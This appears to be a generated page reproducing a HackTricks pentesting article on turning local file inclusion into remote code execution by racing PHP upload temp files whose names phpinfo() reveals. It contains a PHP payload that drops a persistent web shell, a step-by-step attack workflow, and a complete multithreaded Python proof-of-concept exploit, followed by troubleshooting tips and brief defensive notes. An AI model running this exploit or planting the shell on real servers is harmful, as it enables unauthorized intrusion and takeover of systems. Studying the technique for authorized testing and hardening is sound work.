---
parsed_by: focuslocust
source: hacktricks
type: generated
---
# LFI to RCE via PHPInfo

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `hacktricks` |
| Type | `hacktricks-topic` |
| Record ID | `hacktricks-pentesting-web-file-inclusion-lfi2rce-via-phpinfo` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/hacktricks/src/pentesting-web/file-inclusion/lfi2rce-via-phpinfo.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [LFI to RCE via PHPInfo](../../topics/pentesting-web/lfi-to-rce-via-phpinfo.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | hacktricks-pentesting-web-file-inclusion-lfi2rce-via-phpinfo |
| name | LFI to RCE via PHPInfo |
| type | hacktricks-topic |
| source | hacktricks |
| url | https://github.com/HackTricks-wiki/hacktricks/blob/master/src/pentesting-web/file-inclusion/lfi2rce-via-phpinfo.md |

## Preserved Source Material

````yaml
_body: "# LFI to RCE via PHPInfo\n\n{{#include ../../banners/hacktricks-training.md}}\n\nTo exploit this technique you need\
  \ all of the following:\n- A reachable page that prints phpinfo() output.\n- A Local File Inclusion (LFI) primitive you\
  \ control (e.g., include/require on user input).\n- PHP file uploads enabled (file_uploads = On). Any PHP script will accept\
  \ RFC1867 multipart uploads and create a temporary file for each uploaded part.\n- The PHP worker must be able to write\
  \ to the configured upload_tmp_dir (or default system temp directory) and your LFI must be able to include that path.\n\n\
  Classic write-up and original PoC:\n- Whitepaper: LFI with PHPInfo() Assistance (B. Moore, 2011)\n- Original PoC script\
  \ name: phpinfolfi.py (see whitepaper and mirrors)\n\nTutorial HTB: https://www.youtube.com/watch?v=rs4zEwONzzk&t=600s\n\
  \nNotes about the original PoC\n- The phpinfo() output is HTML-encoded, so the \"=>\" arrow often appears as \"=&gt;\".\
  \ If you reuse legacy scripts, ensure they search for both encodings when parsing the _FILES[tmp_name] value.\n- You must\
  \ adapt the payload (your PHP code), REQ1 (the request to the phpinfo() endpoint including padding), and LFIREQ (the request\
  \ to your LFI sink). Some targets don’t need a null-byte (%00) terminator and modern PHP versions won’t honor it. Adjust\
  \ the LFIREQ accordingly to the vulnerable sink.\n\nExample sed (only if you really use the old Python2 PoC) to match HTML-encoded\
  \ arrow:\n```\nsed -i 's/\\[tmp_name\\] =>/\\[tmp_name\\] =&gt;/g' phpinfolfi.py\n```\n\n{{#file}}\nLFI-With-PHPInfo-Assistance.pdf\n\
  {{#endfile}}\n\n## Theory\n\n- When PHP receives a multipart/form-data POST with a file field, it writes the content to\
  \ a temporary file (upload_tmp_dir or the OS default) and exposes the path in $_FILES['<field>']['tmp_name']. The file is\
  \ automatically removed at the end of the request unless moved/renamed.\n- The trick is to learn the temporary name and\
  \ include it via your LFI before PHP cleans it up. phpinfo() prints $_FILES, including tmp_name.\n- By inflating request\
  \ headers/parameters (padding) you can cause early chunks of phpinfo() output to be flushed to the client before the request\
  \ finishes, so you can read tmp_name while the temp file still exists and then immediately hit the LFI with that path.\n\
  \nIn Windows the temp files are commonly under something like C:\\\\Windows\\\\Temp\\\\php*.tmp. In Linux/Unix they are\
  \ usually in /tmp or the directory configured in upload_tmp_dir.\n\n## What to verify in `phpinfo()` before racing\n\nBefore\
  \ sending thousands of requests, extract the values that decide whether the race is realistic:\n\n- `file_uploads`: must\
  \ be `On`.\n- `upload_tmp_dir`: if set, this is the directory your LFI must be able to include. If empty, expect the system\
  \ default temp directory.\n- `open_basedir`: if enabled, your vulnerable include path still needs to be able to reach the\
  \ temp directory shown in `tmp_name`.\n- `output_buffering`: `4096` is a common/default size and is why many PoCs read in\
  \ 4KB chunks, but this value can differ.\n- `zlib.output_compression`, `output_handler`, and any framework-level buffering:\
  \ these reduce the chance of seeing `tmp_name` early enough.\n- `Server API`: useful to decide how much buffering may exist\
  \ between PHP and you (`apache2handler` is usually easier to reason about than `fpm-fcgi` behind a reverse proxy).\n\nIf\
  \ the page does not show `$_FILES`, make sure you are really sending a `multipart/form-data` request with an actual file\
  \ part. PHP only populates `tmp_name` for upload fields that were parsed.\n\n## Attack workflow (step by step)\n\n1) Prepare\
  \ a tiny PHP payload that persists a shell quickly to avoid losing the race (writing a file is generally faster than waiting\
  \ for a reverse shell):\n```\n<?php file_put_contents('/tmp/.p.php', '<?php system($_GET[\"x\"]); ?>');\n```\n\n2) Send\
  \ a large multipart POST directly to the phpinfo() page so it creates a temp file that contains your payload. Inflate various\
  \ headers/cookies/params with ~5–10KB of padding to encourage early output. Make sure the form field name matches what you’ll\
  \ parse in $_FILES.\n\n3) While the phpinfo() response is still streaming, parse the partial body to extract $_FILES['<field>']['tmp_name']\
  \ (HTML-encoded). As soon as you have the full absolute path (e.g., /tmp/php3Fz9aB), fire your LFI to include that path.\
  \ If the include() executes the temp file before it is deleted, your payload runs and drops /tmp/.p.php.\n\n4) Use the dropped\
  \ file: GET /vuln.php?include=/tmp/.p.php&x=id (or wherever your LFI lets you include it) to execute commands reliably.\n\
  \n> Tips\n> - Use multiple concurrent workers to increase your chances of winning the race.\n> - Padding placement that\
  \ commonly helps: URL parameter, Cookie, User-Agent, Accept-Language, Pragma. Tune per target.\n> - If the vulnerable sink\
  \ appends an extension (e.g., .php), you don’t need a null byte; include() will execute PHP regardless of the temp file\
  \ extension.\n\n## Minimal Python 3 PoC (socket-based)\n\nThe snippet below focuses on the critical parts and is easier\
  \ to adapt than the legacy Python2 script. Customize HOST, PHPSCRIPT (phpinfo endpoint), LFIPATH (path to the LFI sink),\
  \ and PAYLOAD.\n\n```python\n#!/usr/bin/env python3\nimport re, html, socket, threading\n\nHOST = 'target.local'\nPORT =\
  \ 80\nPHPSCRIPT = '/phpinfo.php'\nLFIPATH = '/vuln.php?file=%s'  # sprintf-style where %s will be the tmp path\nTHREADS\
  \ = 10\n\nPAYLOAD = (\n    \"<?php file_put_contents('/tmp/.p.php', '<?php system($_GET[\\\\\"x\\\\\"]); ?>'); ?>\\r\\n\"\
  \n)\nBOUND = '---------------------------7dbff1ded0714'\nPADDING = 'A' * 6000\nREQ1_DATA = (f\"{BOUND}\\r\\n\"\n       \
  \      f\"Content-Disposition: form-data; name=\\\"f\\\"; filename=\\\"a.txt\\\"\\r\\n\"\n             f\"Content-Type:\
  \ text/plain\\r\\n\\r\\n{PAYLOAD}{BOUND}--\\r\\n\")\n\nREQ1 = (f\"POST {PHPSCRIPT}?a={PADDING} HTTP/1.1\\r\\n\"\n      \
  \  f\"Host: {HOST}\\r\\nCookie: sid={PADDING}; o={PADDING}\\r\\n\"\n        f\"User-Agent: {PADDING}\\r\\nAccept-Language:\
  \ {PADDING}\\r\\nPragma: {PADDING}\\r\\n\"\n        f\"Content-Type: multipart/form-data; boundary={BOUND}\\r\\n\"\n   \
  \     f\"Content-Length: {len(REQ1_DATA)}\\r\\n\\r\\n{REQ1_DATA}\")\n\nLFI = (\"GET \" + LFIPATH + \" HTTP/1.1\\r\\nHost:\
  \ %s\\r\\nConnection: close\\r\\n\\r\\n\")\n\npat = re.compile(r\"\\\\[tmp_name\\\\]\\\\s*=&gt;\\\\s*([^\\\\s<]+)\")\n\n\
  \ndef race_once():\n    s1 = socket.socket()\n    s2 = socket.socket()\n    s1.connect((HOST, PORT))\n    s2.connect((HOST,\
  \ PORT))\n    s1.sendall(REQ1.encode())\n    buf = b''\n    tmp = None\n    while True:\n        chunk = s1.recv(4096)\n\
  \        if not chunk:\n            break\n        buf += chunk\n        m = pat.search(html.unescape(buf.decode(errors='ignore')))\n\
  \        if m:\n            tmp = m.group(1)\n            break\n    ok = False\n    if tmp:\n        req = (LFI % tmp).encode()\
  \ % HOST.encode()\n        s2.sendall(req)\n        r = s2.recv(4096)\n        ok = b'.p.php' in r or b'HTTP/1.1 200' in\
  \ r\n    s1.close(); s2.close()\n    return ok\n\nif __name__ == '__main__':\n    hit = False\n    def worker():\n     \
  \   nonlocal_hit = False\n        while not hit and not nonlocal_hit:\n            nonlocal_hit = race_once()\n        if\
  \ nonlocal_hit:\n            print('[+] Won the race, payload dropped as /tmp/.p.php')\n            exit(0)\n    ts = [threading.Thread(target=worker)\
  \ for _ in range(THREADS)]\n    [t.start() for t in ts]\n    [t.join() for t in ts]\n```\n\n## Troubleshooting\n- You never\
  \ see tmp_name: Ensure you really POST multipart/form-data to phpinfo(). phpinfo() prints $_FILES only when an upload field\
  \ was present.\n- `tmp_name` appears only at the very end of the response: This is usually a buffering problem, not a PHP-version\
  \ problem. Large `output_buffering` values, `zlib.output_compression`, userland output handlers, or reverse-proxy/FastCGI\
  \ buffering can delay the phpinfo() body until the upload request is almost done.\n- You only get reliable streaming in\
  \ a lab, not through the real site: A CDN, WAF, or reverse proxy may be buffering the upstream response. If you have multiple\
  \ routes to the same app, prefer the most direct origin path.\n- The classic 4096-byte offset logic misses the leak: Treat\
  \ 4096 as a starting point derived from common `output_buffering` defaults, not as a universal constant. Parse incrementally\
  \ and stop as soon as `tmp_name` is complete.\n- The temp file is included but your shell dies immediately: Use a tiny stager\
  \ that writes a second file, because the uploaded temp file will still be deleted when the original request ends.\n- Output\
  \ doesn’t flush early: Increase padding, add more large headers, or send multiple concurrent requests. Some SAPIs/buffers\
  \ won’t flush until larger thresholds; adjust accordingly.\n- LFI path blocked by open_basedir or chroot: You must point\
  \ the LFI to an allowed path or switch to a different LFI2RCE vector.\n- Temp directory not /tmp: phpinfo() prints the full\
  \ absolute tmp_name path; use that exact path in the LFI.\n\n## Practical notes for modern stacks\n\n- This technique is\
  \ still reproducible in modern lab environments; for example, Vulhub keeps a demonstrator on PHP 7.2. In practice, success\
  \ tends to depend more on output buffering and proxying than on a phpinfo-specific patch level.\n- `flush()` and `implicit_flush`\
  \ only influence PHP's own output layer. They do not guarantee that a FastCGI gateway, reverse proxy, browser, or intermediary\
  \ will release partial chunks immediately.\n- If the target is `fpm-fcgi` behind Nginx/Apache proxying, think in layers:\
  \ PHP buffer, PHP output handlers/compression, FastCGI buffering, then proxy buffering. The race only works if enough of\
  \ the phpinfo() response escapes that chain before request shutdown deletes the temp file.\n\n## Defensive notes\n- Never\
  \ expose phpinfo() in production. If needed, restrict by IP/auth and remove after use.\n- Keep file_uploads disabled if\
  \ not required. Otherwise, restrict upload_tmp_dir to a path not reachable by include() in the application and enforce strict\
  \ validation on any include/require paths.\n- Treat any LFI as critical; even without phpinfo(), other LFI→RCE paths exist.\n\
  \n## Related HackTricks techniques\n\n{{#ref}}\nlfi2rce-via-temp-file-uploads.md\n{{#endref}}\n\n{{#ref}}\nvia-php_session_upload_progress.md\n\
  {{#endref}}\n\n{{#ref}}\nlfi2rce-via-nginx-temp-files.md\n{{#endref}}\n\n{{#ref}}\nlfi2rce-via-eternal-waiting.md\n{{#endref}}\n\
  \n\n\n## References\n- LFI With PHPInfo() Assistance whitepaper (2011) – Packet Storm mirror: https://packetstormsecurity.com/files/download/104825/LFI_With_PHPInfo_Assitance.pdf\n\
  - PHP Manual – POST method uploads: https://www.php.net/manual/en/features.file-upload.post-method.php\n- PHP Manual – Flushing\
  \ System Buffers: https://www.php.net/manual/en/outcontrol.flushing-system-buffers.php\n- Vulhub – PHP Local File Inclusion\
  \ RCE with PHPINFO: https://github.com/vulhub/vulhub/blob/master/php/inclusion/README.md\n{{#include ../../banners/hacktricks-training.md}}"
_relative_path: pentesting-web/file-inclusion/lfi2rce-via-phpinfo.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/hacktricks/src/pentesting-web/file-inclusion/lfi2rce-via-phpinfo.md
````
